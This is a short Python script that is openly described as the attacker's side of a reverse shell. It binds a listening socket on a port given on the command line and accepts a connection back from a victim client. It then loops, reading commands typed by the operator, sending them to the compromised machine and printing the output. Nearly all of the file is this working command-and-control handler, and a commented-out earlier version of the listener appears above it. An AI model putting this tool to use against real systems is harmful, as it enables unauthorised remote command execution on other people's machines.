''' This program listens on a port on this machine (Attacker) and waits for the client to connect back. Once the connection comes in. The shell initiates '''
import socket
import sys

''' Locally bind a socket to port so it can receive data '''
#def listen_sock(port):
#    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#    try:
#        s.bind(('0.0.0.0', port))
#    except socket.error as msg:
#        sys.exit("Error: {}\nBind failed. Pagan...".format(msg))
#    
#    print("Binding is done")
#    listen_conns = s.listen(1)
#    print("Listening connections: {}".format(listen_conns))
#    print('Socket is listening... on port {}'.format(port))
    # Wait infinitely
    #'''
    #while 1:
    #    conn, addr = s.accept()
    #    print("Connected: {}".format(addr))
    #No command handler available on the listener
    #'''
    #s.close()

def main():
    attacker = "0.0.0.0"
    port = int(sys.argv[1])
    # create()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.bind((attacker, port))

    s.listen(1)
    print("Listening on port: {}".format(port))

    client_socket, client_address = s.accept()
    print("{}: connected", client_address[1])

    message = "Hello and welcome".encode()
    client_socket.send(message)
    while True:
    	# get the command from prompt
    	command = input("Enter the command you wanna execute:")
    	# send the command to the client
    	client_socket.send(command.encode())
    	if command.lower() == "exit":
        	# if the command is exit, just break out of the loop
        	break
    	# retrieve command results
    	results = client_socket.recv(1024).decode()
    	# print them
    	print(results)
    # close connection to the client
    client_socket.close()
    s.close()
main()
